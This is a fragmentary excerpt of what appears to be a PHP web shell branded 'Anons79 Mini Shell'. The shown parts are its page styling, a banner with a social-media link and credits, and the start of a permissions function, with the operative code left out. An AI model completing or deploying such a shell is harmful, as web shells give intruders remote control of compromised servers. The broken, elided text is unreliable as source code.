...
<title>Anons79 Mini Shell</title>
<style>
body{
color: #fff;
...
text-shadow: 0 0 10px #fff,0 0 20px #33ccff,0 0 40px #33ccff,0 0 60px #33ccff,0 0 90px #33ccff,0 0 5px #33ccff;
}
a{
color: #fff;
...
a:hover{
color: #fff;
text-shadow:0px 0px 10px #3399ff, 0px 0px 20px #3399ff;;
}
...
<BODY>
<H1><center><img src="https://s32.postimg.org/k6ix0n5xh/BP2.png" heigh=40px width=40px />
 <a href="https://fb.com/anons79.official" target="_blank">Anons79 Mini Shell </a><img src="https://s32.postimg.org/k6ix0n5xh/BP2.png" heigh=40px width=40px />
 </center></H1>
...
echo '<br />Anons79 File Manager Version <font color="red">1.0</font>, Coded By <font color="red">Anons79</font><br />Email: <font color="red">anons79.official@gmail.com</font>
</BODY>
</HTML>';
function perms($file){
